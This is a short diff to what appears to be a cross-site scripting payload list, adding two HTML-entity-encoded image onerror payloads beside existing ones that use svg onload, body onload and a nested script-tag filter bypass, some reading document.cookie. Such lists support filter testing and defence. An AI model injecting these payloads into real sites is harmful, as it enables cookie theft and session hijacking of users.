@@ -10,6 +10,8 @@
 <img src="abc" onerror="alert(1)">
 <img src="" onerror="alert(document.cookie)">
 <img src='x' onerror='alert(document.cookie)' />
+&lt;img src=0 onerror=alert(&#39;1&#39;)&gt;
+&lt;img src=0 onerror=alert(document.cookie)&gt;
 <svg/onload=alert(1)>
 <sc<script>ript>alert(1)</sc</script>ript>
 <BODY ONLOAD=alert('1')>
